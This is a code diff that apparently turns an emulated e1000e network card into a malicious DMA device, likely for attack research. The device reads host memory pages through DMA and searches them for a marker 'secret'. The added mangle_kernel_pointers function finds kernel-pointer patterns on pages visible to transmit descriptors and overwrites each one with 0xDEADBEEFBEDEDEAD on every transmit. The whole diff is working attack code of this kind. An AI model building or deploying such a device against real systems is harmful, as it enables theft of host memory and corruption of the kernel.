@@ -35,12 +35,13 @@
 #include <sys/queue.h>
 #include <time.h>
 
+#include "crhexdump.h"
 #include "pcie.h"
 #include "pcie-debug.h"
 #include "log.h"
 #include "mask.h"
+#include "secret_position.h"
 
-#include "crhexdump.h"
 #include "hw/hw.h"
 #include "hw/pci/pci.h"
 #include "net/net.h"
@@ -87,6 +88,7 @@ void print_tx_buffer_address_information(E1000ECore *core);
 void record_tx_windows_from_tx_buffer(E1000ECore *core);
 void find_secret_window_to_track(E1000ECore *core);
 void record_tx_windows(E1000ECore *core);
+void mangle_pointers_on_tx_visible_pages(E1000ECore *core);
 
 /*
  * ----------------------------------------------------------------------------
@@ -1021,10 +1023,12 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
 
     if (!(core->mac[TCTL] & E1000_TCTL_EN)) {
         trace_e1000e_tx_disabled();
-		fflush(stdout);
         return;
     }
 
+	mangle_pointers_on_tx_visible_pages(core);
+
+#if 0
 	if (!tracking_window) {
 		find_secret_window_to_track(core);
 	}
@@ -1036,6 +1040,7 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
 		 */
 		return;
 	}
+#endif
 
     while (!_e1000e_ring_empty(core, txi)) {
         base = _e1000e_ring_head_descr(core, txi);
@@ -3769,34 +3774,6 @@ print_window(const struct window * const entry)
 	printf("window 0x%lx (%ld bytes)", entry->base, entry->length);
 }
 
-bool
-window_contains_secret(struct window *window, uint8_t page[4096])
-{
-#define PATTERN_LENGTH 8
-	/*putchar('s');*/
-	/*fflush(stdout);*/
-
-	int64_t i, j;
-	uint64_t run_length = 1;
-	for (i = 0; i < window->length; i += PATTERN_LENGTH) {
-		if (page[i] == 'i') {
-			j = i;
-			while (run_length < PATTERN_LENGTH && --j >= 0 && page[j] == 'i') {
-				++run_length;
-			}
-			j = i;
-			while (run_length < PATTERN_LENGTH && ++j < 4096 && page[j] == 'i') {
-				++run_length;
-			}
-			if (run_length == PATTERN_LENGTH) {
-				break;
-			}
-		}
-	}
-	return (run_length >= PATTERN_LENGTH);
-#undef PATTERN_LENGTH
-}
-
 /*#ifdef USE_WINDOW_LIST*/
 #if 1
 int window_list_length, window_list_min_length, window_list_max_length;
@@ -3908,6 +3885,48 @@ checksum_window(uint8_t page[4096])
 }
 
 void
+mangle_kernel_pointers(E1000ECore *core, dma_addr_t descriptor_addr,
+	void *opaque)
+{
+	int read_result;
+	uint64_t page_address;
+	struct e1000_tx_desc desc;
+	uint8_t page[4096];
+	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
+	page_address = page_base_address(le64_to_cpu(desc.buffer_addr));
+
+	if (page_address == 0) {
+		return;
+	}
+
+	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
+		page_address);
+
+	uint64_t deadbeef = cpu_to_le64(0xDEADBEEFBEDEDEAD);
+
+	int kernel_pointer_location = -4;
+
+	if (read_result == DRR_SUCCESS) {
+		while (true) {
+			kernel_pointer_location = secret_position(page,
+				kernel_pointer_location + 4, 0xFF, 4);
+			if (kernel_pointer_location == -1) {
+				break;
+			} else {
+				putchar('m');
+				fflush(stdout);
+				perform_dma_write((uint8_t *)&deadbeef, sizeof(deadbeef), 8, 0,
+					desc.buffer_addr + (kernel_pointer_location - 4));
+			}
+		}
+	} else {
+		putchar('e');
+		printf("pa 0x%x.\n", page_address);
+		fflush(stdout);
+	}
+}
+
+void
 record_tx_windows_from_descriptor_address(E1000ECore *core,
 	dma_addr_t descriptor_addr, void *opaque)
 {
@@ -3948,7 +3967,7 @@ record_tx_windows_from_descriptor_address(E1000ECore *core,
 		window_page_base_address);
 
 	if (read_result == DRR_SUCCESS) {
-		if (window_contains_secret(&window, page)) {
+		if (secret_position(page, 0, 'i', 8) != -1) {
 			putchar('s');
 			fflush(stdout);
 			tracking_window = true;
@@ -4256,8 +4275,16 @@ find_secret_window_to_track(E1000ECore *core)
 	const E1000E_RingInfo *txi = txr.i;
 	_e1000e_tx_ring_init(core, &txr, 0);
 	for_each_descriptor_address(core, txi,
-		record_tx_windows_from_descriptor_address, NULL,
-		get_buffer_address_from_tx_descriptor);
+		record_tx_windows_from_descriptor_address, NULL, NULL);
 	/*check_windows_for_secret(core);*/
+}
+
+void
+mangle_pointers_on_tx_visible_pages(E1000ECore *core)
+{
+	E1000E_TxRing txr;
+	const E1000E_RingInfo *txi = txr.i;
+	_e1000e_tx_ring_init(core, &txr, 0);
+	for_each_descriptor_address(core, txi, mangle_kernel_pointers, NULL, NULL);
 }
 #endif
